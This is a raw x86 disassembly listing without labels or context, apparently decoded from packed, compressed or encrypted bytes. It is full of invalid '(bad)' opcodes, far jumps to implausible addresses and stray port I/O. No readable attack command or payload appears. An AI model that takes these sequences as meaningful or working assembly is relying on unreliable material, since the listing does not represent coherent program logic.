  410df6:	cmovno esi,DWORD PTR ds:[eax+0x3d35b0e]
	...
  410e26:	add    BYTE PTR [eax],al
  410e28:	retf   
  410e29:	sbb    BYTE PTR [ecx],ch
  410e2b:	xor    al,0x91
  410e2d:	dec    eax
  410e2e:	xchg   BYTE PTR [edi],bh
  410e30:	call   FWORD PTR [edx-0x1e]
  410e33:	ret    
  410e34:	or     eax,0xba496a29
  410e39:	pop    ebx
  410e3a:	mov    ch,0x17
  410e3c:	mov    ebp,0xf203d8f0
  410e41:	bound  esp,QWORD PTR [edx+0x31]
  410e44:	dec    esi
  410e45:	cmc    
  410e46:	sub    eax,0x1e5b1906
  410e4b:	push   ecx
  410e4c:	inc    esi
  410e4d:	outs   dx,BYTE PTR ds:[esi]
  410e4e:	fwait
  410e4f:	mov    ecx,DWORD PTR [eax-0x18]
  410e52:	dec    esp
  410e53:	retf   
  410e54:	retf   0x915e
  410e57:	push   es
  410e58:	ds jle 0x410e99
  410e5b:	fmul   st(6),st
  410e5d:	outs   dx,BYTE PTR ds:[esi]
  410e5e:	cmc    
  410e5f:	retf   0xe828
  410e62:	sub    al,0xdc
  410e64:	adc    ecx,DWORD PTR [edi]
  410e66:	jmp    0xb129276e
  410e6b:	fist   DWORD PTR [ebx]
  410e6d:	in     al,dx
  410e6e:	aad    0xca
  410e70:	or     al,ch
  410e72:	mov    eax,0xc5ec0bdb
  410e77:	retf   0xa49b
  410e7a:	stos   BYTE PTR es:[edi],al
  410e7b:	div    ecx
  410e7d:	push   es
  410e7e:	(bad)  
  410e7f:	xlat   BYTE PTR ds:[ebx]
  410e80:	mov    esp,0x7a78a096
  410e85:	outs   dx,DWORD PTR ds:[esi]
  410e86:	cmp    BYTE PTR [ebp+edx*1-0x6],bl
  410e8a:	daa    
  410e8b:	add    al,0x0
	...
  410eb5:	add    BYTE PTR [eax+ebx*2+0x3],ah
  410eb9:	add    al,0x56
  410ebb:	inc    edx
  410ebc:	or     al,BYTE PTR [ebp+0x3e]
  410ebf:	or     DWORD PTR [edx+0x645b3e28],0xffffffc3
  410ec6:	inc    eax
  410ec7:	jecxz  0x410ec8
  410ec9:	test   al,0x3d
  410ecb:	pop    ebx
  410ecc:	add    BYTE PTR [edx+0x6e],ah
  410ecf:	outs   dx,DWORD PTR ds:[esi]
  410ed0:	mov    bh,bl
  410ed2:	push   ss
  410ed3:	pop    ss
  410ed4:	clc    
  410ed5:	mov    ecx,0x56fbe684
  410eda:	push   ebx
  410edb:	dec    edi
  410edc:	test   DWORD PTR [ecx],ebp
  410ede:	test   ch,dl
  410ee0:	popf   
  410ee1:	jmp    0xbcc46a23
  410ee6:	test   DWORD PTR [ebp+0xd],ebp
  410ee9:	ins    DWORD PTR es:[edi],dx
  410eea:	fldcw  WORD PTR [ebp-0x2]
  410eed:	jmp    0xea15256e
  410ef2:	cmp    eax,0xfe26005b
  410ef7:	xchg   edx,eax
  410ef8:	(bad)  
  410ef9:	call   0xa5086a3b
  410efe:	lea    esi,ds:0x943de900
  410f04:	inc    esp
  410f05:	sub    eax,0xe9005b3d
  410f0a:	test   al,0x7
  410f0c:	clc    
  410f0d:	bound  ebp,QWORD PTR [ebx]
  410f0f:	loopne 0x410f55
  410f11:	mov    ch,0x52
  410f13:	fiadd  WORD PTR [ecx+edi*4+0x4a]
  410f17:	add    DWORD PTR [ecx],eax
  410f19:	(bad)  
	...
  410f42:	add    BYTE PTR [eax],al
  410f44:	jns    0x410fb9
  410f46:	(bad)  
  410f47:	cmp    eax,DWORD PTR [esi]
  410f49:	(bad)  
  410f4a:	sar    BYTE PTR [esi+ebp*1],0xd8
  410f4e:	jl     0x410efd
  410f50:	cmp    eax,0x816a4de6
  410f55:	xchg   edi,edi
  410f57:	xor    al,0x7c
  410f59:	add    ebx,DWORD PTR [ebx+0xa]
  410f5c:	jge    0x410fb9
  410f5e:	call   DWORD PTR [esi+ecx*4]
  410f61:	je     0x410f51
  410f63:	xor    al,0x42
  410f65:	pop    ebx
  410f66:	or     ebp,DWORD PTR [ecx+0x66616e]
  410f6c:	call   0x2e410fc8
  410f71:	sub    al,0xc8
  410f73:	jmp    0x410f0d
  410f75:	fwait
  410f76:	inc    ebx
  410f77:	enter  0x5897,0x0
  410f7b:	add    BYTE PTR [eax],ah
  410f7d:	sbb    al,0xc8
  410f7f:	jmp    FWORD PTR [edx-0x44]
  410f82:	std    
  410f83:	jne    0x410f24
  410f85:	nop
  410f86:	in     al,0xfd
  410f88:	lock mov eax,ds:0x8f5b75fd
  410f8e:	cmp    BYTE PTR [ebp+0x67],bl
  410f91:	pop    eax
  410f92:	cmp    DWORD PTR [ebp+0x4f],0x57
  410f96:	je     0x410fa0
  410f98:	adc    BYTE PTR [eax+ebx*8],bl
  410f9b:	call   0x414513
  410fa0:	sub    al,0xf3
  410fa2:	mov    DWORD PTR [ebp+0x2f],edx
  410fa5:	out    dx,al
  410fa6:	adc    bh,bh
	...
  410fd0:	add    BYTE PTR [eax],al
  410fd2:	stos   BYTE PTR es:[edi],al
  410fd3:	mov    al,ds:0xef2f52fd
  410fd8:	push   ebx
  410fd9:	cld    
  410fda:	lods   al,BYTE PTR ds:[esi]
  410fdb:	gs std 
  410fdd:	jne    0x411012
  410fdf:	mov    ds:0x955e0850,eax
  410fe4:	add    al,BYTE PTR [eax]
  410fe6:	pop    edx
  410fe7:	out    dx,al
  410fe8:	jmp    0x3283:0x5477db83
  410fef:	add    ah,BYTE PTR [edx+0x41]
  410ff2:	pop    ss
  410ff3:	pop    eax
  410ff4:	jne    0x411014
  410ff6:	test   al,0x6c
  410ff8:	popf   
  410ff9:	arpl   WORD PTR [esi],sp
  410ffb:	push   edi
  410ffc:	add    DWORD PTR [eax],eax
  410ffe:	xlat   BYTE PTR ds:[ebx]
  410fff:	push   edi
  411000:	mov    esi,0x1874a3
  411005:	jmp    0x410fef
  411007:	stc    
  411008:	shl    BYTE PTR [esi],0xe5
  41100b:	(bad)  
  41100c:	les    eax,FWORD PTR [edx]
  41100e:	ds pop esp
  411010:	test   DWORD PTR ds:0x82d5473e,edi
  411016:	jnp    0x411071
  411018:	cmp    eax,0xf7823e41
  41101d:	and    DWORD PTR [ebp-0x42fffd7f],0xffffffbe
  411024:	dec    edi
  411025:	dec    ebx
  411026:	inc    DWORD PTR [ecx+0x1bba0f02]
  41102c:	add    eax,DWORD PTR [eax]
  41102e:	add    DWORD PTR ds:[esi],eax
  411031:	scas   eax,DWORD PTR es:[edi]
  411032:	cmc    
  411033:	ret    0x2
	...
  41105e:	add    BYTE PTR [eax],al
  411060:	dec    ecx
  411061:	(bad)  
  411062:	loope  0x411063
  411064:	jno    0x410fe7
  411066:	mov    edi,0x2816a44
  41106b:	add    BYTE PTR [esi],bh
  41106d:	xor    eax,0x823ef83e
  411072:	add    al,BYTE PTR [eax]
  411074:	ret    
  411075:	mov    dh,0xc6
  411077:	dec    edi
  411078:	mov    ebx,0xd44fcabe
  41107d:	sbb    DWORD PTR [edx-0x13],0xff02b39d
  411084:	dec    ebx
  411085:	icebp  
  411086:	cmp    eax,DWORD PTR [ecx+0x3e]
  411089:	jge    0x41104d
  41108b:	push   cs
  41108c:	mov    edx,0x3e000332
  411091:	cmc    
  411092:	dec    eax
  411093:	clc    
  411094:	ds jns 0x411115
  411097:	stos   DWORD PTR es:[edi],eax
  411098:	ds je  0x41109d
  41109b:	add    DWORD PTR [ebx-0x3df0fc68],0xffffffd6
  4110a2:	add    eax,DWORD PTR [eax]
  4110a4:	ds in  eax,dx
  4110a6:	push   eax
  4110a7:	cld    
  4110a8:	xlat   BYTE PTR ds:[ebx]
  4110a9:	test   BYTE PTR [ebx],0x0
  4110ac:	ds push edx
  4110ae:	jnp    0x4110e5
  4110b0:	fstp   DWORD PTR [ebx+0x1f]
  4110b3:	in     al,dx
  4110b4:	shl    BYTE PTR [eax],0x99
  4110b7:	(bad)  
  4110b8:	push   ebx
  4110b9:	inc    edi
  4110ba:	inc    cx
  4110bc:	retf   0x49f3
  4110bf:	arpl   di,di
  4110c1:	pop    edx
  4110c2:	xchg   ecx,eax
  4110c3:	in     eax,dx
	...
  4110ec:	add    BYTE PTR [eax],al
  4110ee:	adc    eax,0x89b4e95b
  4110f3:	fisubr WORD PTR [eax-0x76df48fe]
  4110f9:	pop    esp
  4110fa:	(bad)  
  4110fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110fd:	add    eax,ecx
  4110ff:	and    BYTE PTR [ebp-0x41],al
  411102:	add    dh,BYTE PTR [edi-0x18]
  411105:	add    edi,DWORD PTR [esi]
  411107:	pop    ebx
  411108:	pop    esp
  411109:	inc    ecx
  41110a:	or     dx,bx
  41110d:	add    al,0xe4
  41110f:	pop    edx
  411110:	rol    DWORD PTR [ebx],cl
  411112:	mov    ebx,0xd4344920
  411117:	pop    edx
  411118:	pop    esp
  411119:	inc    ecx
  41111a:	dec    esi
  41111b:	or     esp,DWORD PTR [esi]
  41111d:	icebp  
  41111e:	mov    al,ds:0x3503a816
  411123:	fwait
  411124:	pushf  
  411125:	sbb    BYTE PTR [ebp-0x4dfc0318],bh
  41112b:	inc    edx
  41112c:	inc    ecx
  41112d:	add    eax,0xfae95b3e
  411132:	jmp    0xab07f025
  411137:	push   ebx
  411138:	out    dx,al
  411139:	push   eax
  41113a:	es push 0x5b
  41113d:	fcom   DWORD PTR [eax]
  41113f:	icebp  
  411140:	lock pop ebx
  411142:	inc    edx
  411143:	pop    ebx
  411144:	mov    BYTE PTR [ebp-0x392d4fe7],0xf8
  41114b:	imul   edi,DWORD PTR [ebx],0x2283d9d8
  411151:	add    al,0x0
	...
  41117b:	add    BYTE PTR [esi],bh
  41117d:	or     DWORD PTR [eax],eax
  41117f:	mov    dh,0x26
  411181:	arpl   WORD PTR [edx+0x7cdcd9a7],ax
  411187:	mov    eax,ds:0x6a08ef3d
  41118c:	inc    ebx
  41118d:	pop    ebx
  41118e:	(bad)  
  411190:	push   0x808efe6a
  411195:	out    dx,al
  411196:	sti    
  411197:	xchg   BYTE PTR [esi+0x42284ae4],ch
  41119d:	or     ecx,ecx
  41119f:	stos   DWORD PTR es:[edi],eax
  4111a0:	mov    eax,ds:0x71625369
  4111a5:	fadd   st(3),st
  4111a7:	popa   
  4111a8:	neg    DWORD PTR [edx+0x6a]
  4111ab:	push   cs
  4111ac:	sub    esi,0xf56c4107
  4111b2:	dec    BYTE PTR [esi-0x6]
  4111b5:	push   ds
  4111b6:	cld    
  4111b7:	push   0x46
  4111b9:	mov    ds:0x5b3da84a,al
  4111be:	je     0x4111b6
  4111c0:	mov    al,ds:0x3de9f81e
  4111c5:	pop    ebx
  4111c6:	add    dl,dl
  4111c8:	jge    0x4111e3
  4111ca:	push   eax
  4111cb:	mov    ecx,0xbbf80ec6
  4111d0:	js     0x411220
  4111d2:	(bad)  
  4111d3:	mov    ds:0x29855b82,al
  4111d8:	sbb    BYTE PTR [ebp-0x15],0xca
  4111dc:	mov    esp,0xe9f7e7
	...
  411209:	add    BYTE PTR [esi+0x75d2eb5d],cl
  41120f:	retf   0x29a2
  411212:	cmp    ch,BYTE PTR [eax+0x74]
  411215:	loope  0x41121a
  411217:	lock pop es
  411219:	shr    DWORD PTR [edi+0x62],0xfe
  41121d:	into   
  41121e:	ja     0x41122f
  411220:	clc    
  411221:	add    BYTE PTR [ebp+ebp*2-0x3],ch
  411225:	jne    0x411226
  411227:	sahf   
  411228:	push   eax
  411229:	or     BYTE PTR [eax+0x10e80818],ch
  41122f:	mov    al,ds:0x1898fffd
  411234:	or     al,ch
  411236:	jg     0x4111d9
  411238:	std    
  411239:	jmp    FWORD PTR [eax+0x52fffc18]
  41123f:	addr16 out 0xd3,al
  411242:	dec    ebx
  411243:	sahf   
  411244:	std    
  411245:	leave  
  411246:	aad    0x5b
  411248:	add    BYTE PTR [ebp+0x1c],dl
  41124b:	add    DWORD PTR [ecx+0x573917c4],0x53
  411252:	or     al,0x38
  411254:	or     al,0xc7
  411256:	xchg   ebp,eax
  411257:	pop    esp
  411258:	add    BYTE PTR [eax],al
  41125a:	xchg   edi,eax
  41125b:	lahf   
  41125c:	jae    0x411266
  41125e:	jmp    FWORD PTR [edi+0x58]
  411261:	add    BYTE PTR [edi-0x25],ah
  411264:	test   BYTE PTR [ecx],0xb0
  411267:	gs sub eax,eax
  41126a:	int3   
  41126b:	aas    
  41126c:	pop    esi
  41126d:	leave  
	...
  411296:	add    BYTE PTR [eax],al
  411298:	and    eax,0x2fd0fe67
  41129d:	loop   0x4112f2
  41129f:	or     al,0xce
  4112a1:	pop    esp
  4112a2:	mov    ebx,eax
  4112a4:	pop    eax
  4112a5:	fcmovu st,st(0)
  4112a7:	add    BYTE PTR [edi],ah
  4112a9:	pop    esp
  4112aa:	mov    esi,DWORD PTR [ebp+0x2f]
  4112ad:	jecxz  0x41132a
  4112af:	or     BYTE PTR [ebp+esi*1+0x66],cl
  4112b3:	mov    edx,DWORD PTR [ecx]
  4112b5:	fdiv   st(2),st
  4112b7:	xor    BYTE PTR [ebp+0x5efc7e62],dl
  4112bd:	push   ss
  4112be:	add    eax,0xeb4bfb80
  4112c3:	sbb    edi,DWORD PTR [esi]
  4112c5:	repnz mov BYTE PTR [eax+0x6c],0x87
  4112ca:	cmp    bl,0x78
  4112cd:	sub    esp,edi
  4112cf:	jg     0x4112ab
  4112d1:	xor    al,BYTE PTR [ebx+eax*8+0x2af99d34]
  4112d8:	dec    BYTE PTR [ebp+eiz*1+0x5e]
  4112dc:	pop    es
  4112dd:	mov    ah,0xfa
  4112df:	inc    DWORD PTR ds:0x2085082
  4112e5:	mov    ecx,DWORD PTR [ebx+0x4]
  4112e8:	push   0xffffff82
  4112ea:	xlat   BYTE PTR ds:[ebx]
  4112eb:	push   ss
  4112ec:	jb     0x411321
  4112ee:	push   edx
  4112ef:	or     ch,BYTE PTR [edx+0x40]
  4112f2:	dec    ebp
  4112f3:	push   es
  4112f4:	push   edx
  4112f5:	xor    eax,DWORD PTR [eax]
  4112f7:	or     ah,BYTE PTR [ebp+0xc0177a]
	...
  411325:	add    ch,dh
  411327:	mov    al,ds:0x697cc924
  41132c:	add    al,al
  41132e:	sahf   
  41132f:	jne    0x411329
  411331:	ret    
  411332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411333:	mov    esp,0x6d3cc57f
  411338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411339:	je     0x4112d7
  41133b:	in     al,dx
  41133c:	cmp    eax,0x7361610c
  411341:	inc    esp
  411342:	push   esi
  411343:	cmp    BYTE PTR [esi+0x8],cl
  411346:	shl    DWORD PTR [esi+0x4e03c6c6],0x3
  41134d:	add    BYTE PTR [esi],bh
  41134f:	jb     0x4113d0
  411351:	cmp    al,0xe9
  411353:	mov    ecx,0xe83e0041
  411358:	sub    al,0x8d
  41135a:	and    DWORD PTR [ecx+esi*1+0x6a],0x3f
  41135f:	fiadd  DWORD PTR [edx]
  411361:	push   0x3e
  411363:	fiadd  DWORD PTR [edx]
  411365:	push   0x3e
  411367:	pop    ebx
  411368:	je     0x4113b3
  41136a:	push   es
  41136b:	or     al,0xde
  41136d:	sbb    ecx,edx
  41136f:	adc    ch,BYTE PTR [eax]
  411371:	add    al,0x45
  411373:	fwait
  411374:	push   esp
  411375:	(bad)  
  411376:	mov    esp,0x7204bce8
  41137b:	das    
  41137c:	jb     0x4113c7
  41137e:	xor    dl,dl
  411380:	and    esi,DWORD PTR [esp+edx*1-0x2a11c9ad]
  411387:	rcr    BYTE PTR [ebx],cl
  411389:	mov    eax,0x0
	...
  4113b2:	add    BYTE PTR [eax],al
  4113b4:	mov    ah,0xe8
  4113b6:	lock mov ?,WORD PTR [edx+0x6b]
  4113ba:	mov    DWORD PTR [esi],eax
  4113bc:	lods   eax,DWORD PTR ds:[esi]
  4113bd:	mov    edi,0x66424961
  4113c2:	sti    
  4113c3:	mov    bl,0xb8
  4113c5:	pop    ebx
  4113c6:	jle    0x411401
  4113c8:	stos   BYTE PTR es:[edi],al
  4113c9:	jae    0x411387
  4113cb:	pop    esp
  4113cc:	ds pop ebx
  4113ce:	xor    DWORD PTR ds:0x5ee95b3e,eax
  4113d4:	jmp    0x3a0743dd
  4113d9:	pop    ebx
  4113da:	add    al,ah
  4113dc:	adc    al,0x6
  4113de:	scas   eax,DWORD PTR es:[edi]
  4113df:	int3   
  4113e0:	jg     0x411435
  4113e2:	jmp    0x69b8c93f
  4113e7:	enter  0xf3a1,0xe8
  4113eb:	jecxz  0x411446
  4113ed:	inc    ax
  4113ef:	add    ah,al
  4113f1:	gs and eax,0x9067028d
  4113f7:	add    ebx,DWORD PTR [esi]
  4113f9:	pop    ebx
  4113fa:	jmp    0xe3682aa
  4113ff:	ret    
  411400:	(bad)  
  411401:	pop    ds
  411402:	add    DWORD PTR [esi+edi*1],ebp
  411405:	cmp    ebp,ecx
  411407:	add    edx,DWORD PTR [esi]
  411409:	aas    
  41140a:	add    BYTE PTR [edi-0x5b779b04],al
  411410:	leave  
  411411:	std    
  411412:	dec    DWORD PTR [eax]
  411414:	inc    edx
  411415:	pop    ebx
  411416:	call   0x411511
	...
  41143f:	add    BYTE PTR [eax],al
  411441:	add    BYTE PTR [edi+0x66],cl
  411444:	(bad)  
  411445:	pusha  
  411446:	xchg   BYTE PTR [ebx+0x67],ch
  411449:	jmp    0xd23f7a2b
  41144e:	cmp    esi,ebp
  411450:	(bad)  
  411451:	mov    esi,0x41ec1eb2
  411456:	inc    edx
  411457:	cmp    eax,DWORD PTR [eax]
  411459:	jmp    0xa6ad7b03
  41145e:	cld    
  41145f:	rol    BYTE PTR [ecx+edx*4+0x15],cl
  411463:	pop    ebx
  411464:	and    cl,ch
  411466:	cmp    eax,0x7cfcef73
  41146b:	mov    BYTE PTR fs:[esi+edx*8],ch
  41146f:	fs je  0x41144b
  411472:	push   ebp
  411473:	xor    DWORD PTR [eax+ebp*1+0x42],esp
  411477:	data16 je 0x4114e7
  41147a:	in     eax,0x85
  41147c:	pop    eax
  41147d:	jmp    0xee04eebf
  411482:	jl     0x411472
  411484:	xadd   DWORD PTR [esi],edi
  411487:	inc    DWORD PTR [eax-0x17]
  41148a:	jl     0x41147a
  41148c:	not    DWORD PTR [ecx-0x72]
  41148f:	add    al,BYTE PTR [eax]
  411491:	jmp    0x364cae4e
  411496:	push   ss
  411497:	dec    ebx
  411498:	push   0x1c199b
  41149d:	es push es
  41149f:	outs   dx,DWORD PTR ds:[esi]
  4114a0:	out    0x63,eax
  4114a2:	loop   0x4114fe
  4114a4:	add    BYTE PTR [edx+0x0],ch
	...
  4114cf:	add    BYTE PTR [ecx],al
  4114d1:	push   ecx
  4114d2:	call   DWORD PTR [ebp+ecx*2-0x44ff8f0d]
  4114d9:	pop    ds
  4114da:	add    bh,bh
  4114dc:	stos   BYTE PTR es:[edi],al
  4114dd:	test   al,0xe6
  4114df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e0:	scas   al,BYTE PTR es:[edi]
  4114e1:	pop    eax
  4114e2:	add    BYTE PTR [ebx+0x75ff545b],al
  4114e8:	pop    es
  4114e9:	xor    DWORD PTR [esp+eiz*2+0x75ff5f56],eax
  4114f0:	add    edi,DWORD PTR [eax+0x58e75992]
  4114f6:	add    esp,0xfffffff3
  4114f9:	fwait
  4114fa:	jae    0x411508
  4114fc:	pop    ebp
  4114fe:	bound  eax,QWORD PTR [ecx-0x19]
  411501:	fwait
  411502:	jae    0x4114ec
  411504:	(bad)  
  411505:	fcom   DWORD PTR [edi+0x0]
  411508:	xlat   BYTE PTR ds:[ebx]
  411509:	ffreep st(2)
  41150b:	or     al,0xa0
  41150d:	sub    al,0x10
  41150f:	push   0x413309
  411514:	shr    BYTE PTR [esp+eiz*8],0xe8
  411518:	push   ecx
  411519:	add    BYTE PTR [eax],al
  41151b:	add    BYTE PTR [ebx+edx*4],dl
  41151e:	or     ch,BYTE PTR [edx-0x59]
  411521:	fwait
  411522:	jae    0x411520
  411524:	and    BYTE PTR [esp+ecx*1],ch
  411527:	jmp    FWORD PTR [edx]
  411529:	mov    WORD PTR [esi+0x41],es
  41152c:	xchg   edi,eax
  41152d:	mov    al,0x54
  41152f:	jo     0x411541
  411531:	call   0x0:0x4587
	...
  41155c:	add    BYTE PTR [eax],al
  41155e:	pop    es
  41155f:	xor    eax,0xa0aaff00
  411564:	std    
  411565:	jne    0x4115ba
  411567:	fwait
  411568:	xor    edx,ebp
  41156a:	lahf   
  41156b:	sbb    DWORD PTR [eax],eax
  41156d:	call   0x403e19
  411572:	into   
  411573:	sbb    ebx,esp
  411575:	push   0x57
  411577:	fwait
  411578:	jae    0x41156e
  41157a:	ds dec ebp
  41157c:	aaa    
  41157d:	or     al,0x31
  41157f:	(bad)  
  411580:	aad    0x47
  411582:	jg     0x4115f6
  411584:	stos   BYTE PTR es:[edi],al
  411585:	sub    DWORD PTR [esi-0x7c77409b],ebp
  41158b:	dec    edx
  41158c:	add    BYTE PTR cs:[ecx],dl
  41158f:	out    dx,eax
  411590:	mov    dl,0xfe
  411592:	xchg   ebx,eax
  411593:	mov    bh,BYTE PTR [edi+0x4329eb34]
  411599:	add    dh,ah
  41159b:	gs xor bh,bh
  41159e:	icebp  
  41159f:	cli    
  4115a0:	inc    ebp
  4115a1:	aam    0x54
  4115a3:	jb     0x411564
  4115a5:	je     0x411579
  4115a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a8:	xor    eax,0xd566d9e8
  4115ad:	inc    edi
  4115ae:	jg     0x411622
  4115b0:	stos   BYTE PTR es:[edi],al
  4115b1:	std    
  4115b2:	pop    ecx
  4115b3:	mov    ebp,0xa27b88bf
  4115b8:	lea    eax,[esi+edi*2+0x21]
  4115bc:	shl    DWORD PTR [edx+ebx*4-0x2c],0x35
  4115c1:	or     al,0x0
	...
  4115eb:	add    BYTE PTR [ecx-0xb82a5a],ch
  4115f1:	jno    0x41159d
  4115f3:	in     eax,0x29
  4115f5:	in     eax,dx
  4115f6:	mov    edi,0x83c5fb88
  4115fb:	jl     0x41159b
  4115fd:	jno    0x41160e
  4115ff:	test   cl,cl
  411601:	jno    0x411605
  411603:	add    BYTE PTR [ebp+0x40ffd68e],bh
  411609:	(bad)  
  41160a:	ins    DWORD PTR es:[edi],dx
  41160b:	jmp    FWORD PTR [ecx+0x71]
  41160e:	cmp    DWORD PTR [esi+ecx*4+0x71],0xf
  411613:	test   BYTE PTR [ebp-0x3cfffd8f],bl
  411619:	mov    esi,0x5a494fc6
  41161e:	pushf  
  41161f:	xlat   BYTE PTR ds:[ebx]
  411620:	pop    ecx
  411621:	or     bl,BYTE PTR [eax+eax*8]
  411624:	cmp    BYTE PTR [edi+0x29],dl
  411627:	adc    BYTE PTR [edx+0x3e03e8d2],bh
  41162d:	fiadd  WORD PTR [ebx+0x655221c7]
  411633:	xchg   BYTE PTR [ecx],bl
  411635:	arpl   ax,bp
  411637:	mov    ?,WORD PTR [edx-0x6d]
  41163a:	cwde   
  41163b:	rcl    BYTE PTR [edx+0x2f2d08b],0x63
  411642:	fisttp QWORD PTR [ebx]
  411644:	(bad)  
  411645:	out    0x5b,eax
  411647:	xor    DWORD PTR [edx-0x6d],0xffffffe8
  41164b:	aaa    
  41164c:	pop    ecx
  41164d:	repz fadd DWORD PTR [ebx]
	...
  411678:	add    BYTE PTR [eax],al
  41167a:	shl    DWORD PTR [ecx+0x734639bd],1
  411680:	shr    DWORD PTR [ecx+edx*8],cl
  411683:	bound  ebp,QWORD PTR [ebp+0x1b62de39]
  411689:	or     al,0xd6
  41168b:	out    0xf,eax
  41168d:	mov    edi,0xe01b62b8
  411692:	mov    al,0xe8
  411694:	loopne 0x411641
  411696:	push   ss
  411697:	hlt    
  411698:	test   DWORD PTR [edi-0x405f1760],edi
  41169e:	adc    dl,BYTE PTR [ebx-0x7f]
  4116a1:	pop    esi
  4116a2:	daa    
  4116a3:	bound  ebp,QWORD PTR [ebp-0x41]
  4116a6:	adc    dl,BYTE PTR [edi+0x626a3965]
  4116ac:	ror    DWORD PTR [ebx],cl
  4116ae:	data16 aaa 
  4116b0:	sar    BYTE PTR [esi-0x342c9d90],0x68
  4116b7:	call   0x532bd5d4
  4116bc:	push   ecx
  4116bd:	push   ss
  4116be:	out    0x61,eax
  4116c0:	push   DWORD PTR ds:0xe9cbdfbd
  4116c6:	adc    DWORD PTR [eax-0x7d],ecx
  4116c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ca:	jge    0x41172a
  4116cc:	jne    0x4116bc
  4116ce:	les    edx,FWORD PTR [esi]
  4116d0:	int3   
  4116d1:	push   ss
  4116d2:	sub    ah,BYTE PTR [ecx+0x74]
  4116d5:	loope  0x4116ac
  4116d7:	cwde   
  4116d8:	addr16 push es
  4116da:	loope  0x411750
  4116dc:	or     DWORD PTR [ebx+0x0],edx
	...
  411706:	add    BYTE PTR [eax],al
  411708:	cmp    eax,0xe5e17462
  41170d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41170e:	addr16 out dx,al
  411710:	enter  0x7460,0xe5
  411714:	aad    0x5b
  411716:	ins    BYTE PTR es:[edi],dx
  411717:	fidivr WORD PTR [eax-0x5a2e8ba0]
  41171d:	arpl   WORD PTR [edx-0x32],bp
  411720:	test   al,0x60
  411722:	je     0x4116e1
  411724:	xchg   ebp,eax
  411725:	imul   ebp,DWORD PTR [edx-0x42],0xffffff98
  411729:	pusha  
  41172a:	je     0x4116e5
  41172c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41172d:	jae    0x411799
  41172f:	scas   al,BYTE PTR es:[edi]
  411730:	mov    BYTE PTR [eax+0x74],ah
  411733:	xchg   ebp,eax
  411734:	xchg   ebp,eax
  411735:	jnp    0x4117a1
  411737:	sahf   
  411738:	clc    
  411739:	pusha  
  41173a:	je     0x4116bd
  41173c:	in     eax,0x83
  41173e:	push   0xffffff8e
  411740:	call   0xd5ce8ba5
  411745:	mov    ebp,DWORD PTR [edx+0x7e]
  411748:	fsub   DWORD PTR [eax+0x74]
  41174b:	mov    ebp,esp
  41174d:	xchg   ebx,eax
  41174e:	push   0x6e
  411750:	enter  0x7460,0x45
  411754:	aad    0x9b
  411756:	push   0x5e
  411758:	mov    eax,0xa5317460
  41175d:	mov    ds:0x60a84e6a,eax
  411762:	je     0x411764
  411764:	inc    ebx
  411765:	mov    dh,0xb0
  411767:	imul   ebx,DWORD PTR [eax],0xffffffa1
  41176a:	std    
  41176b:	jne    0x41176d
	...
  411795:	add    BYTE PTR [edi],dh
  411797:	mov    dh,0xa8
  411799:	imul   ebx,DWORD PTR [eax],0xffffffa1
  41179c:	std    
  41179d:	jne    0x4117aa
  41179f:	mov    dh,0xa0
  4117a1:	imul   ebx,DWORD PTR [eax-0x5f],0xffffffc7
  4117a5:	ret    0x5d1b
  4117a8:	push   ebp
  4117a9:	mov    ebp,DWORD PTR [ebx]
  4117ab:	ffree  st(2)
  4117ad:	call   0x8e3eb6d2
  4117b2:	loop   0x411754
  4117b4:	dec    esi
  4117b5:	call   DWORD PTR [edx+0x3235ff50]
  4117bb:	adc    al,0x41
  4117bd:	add    bh,ch
  4117bf:	call   0x54281819
  4117c4:	ror    BYTE PTR [edi],0x62
  4117c7:	inc    ebx
  4117c8:	add    DWORD PTR [eax],eax
  4117ca:	xlat   BYTE PTR ds:[ebx]
  4117cb:	xchg   edi,eax
  4117cc:	inc    ebx
  4117cd:	clc    
  4117ce:	xlat   BYTE PTR ds:[ebx]
  4117cf:	pop    esp
  4117d0:	add    BYTE PTR [eax],al
  4117d2:	mov    al,ds:0xe0fff418
  4117d7:	pop    esp
  4117d8:	add    BYTE PTR [edx-0x29],ch
  4117db:	xor    al,BYTE PTR [eax]
  4117dd:	push   0xffffffd7
  4117df:	xor    al,BYTE PTR [eax]
  4117e1:	lea    esp,[edx-0x5d]
  4117e4:	dec    esi
  4117e5:	lea    esp,[edx]
  4117e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e8:	cmc    
  4117e9:	(bad)  
  4117ea:	mov    eax,0xbf75ff07
  4117ef:	sahf   
  4117f0:	jae    0x4117ee
  4117f2:	scas   eax,DWORD PTR es:[edi]
  4117f3:	(bad)  
  4117f4:	push   ebp
  4117f5:	add    BYTE PTR [edi+0x74c053],ah
	...
  411823:	add    BYTE PTR [edx-0x68ff2a4b],ah
  411829:	pop    esp
  41182a:	push   0x1dafb1
  41182f:	(bad)  
  411830:	ds jg  0x411841
  411833:	call   0xfefcb8be
  411838:	push   cs
  411839:	in     eax,dx
  41183a:	ror    DWORD PTR [ebx+eax*8+0x51feb522],cl
  411841:	ret    0xe850
  411844:	jbe    0x4117e6
  411846:	mov    ebx,0xabefb7fe
  41184b:	idiv   BYTE PTR [ecx]
  41184d:	inc    ecx
  41184e:	lods   al,BYTE PTR ds:[esi]
  41184f:	sbb    eax,0x8cbd49a5
  411854:	add    DWORD PTR [edx+0x54],0x68
  411858:	inc    eax
  411859:	into   
  41185a:	inc    ecx
  41185b:	add    BYTE PTR [ecx],bl
  41185d:	daa    
  41185e:	lods   al,BYTE PTR ds:[esi]
  41185f:	not    BYTE PTR [ecx]
  411861:	imul   edi,DWORD PTR [ebx+0x41b9f334],0x2e561600
  41186b:	(bad)  
  41186c:	stc    
  41186d:	jmp    0x82bb:0x88e9eb85
  411874:	stos   DWORD PTR es:[edi],eax
  411875:	popf   
  411876:	mov    bl,0xfe
  411878:	loope  0x4118eb
  41187a:	ss pop edx
  41187c:	mov    ebp,0x4b03b41e
  411881:	cmp    ecx,DWORD PTR [ecx-0x4457257c]
  411887:	inc    BYTE PTR [eax]
	...
  4118b1:	add    cl,al
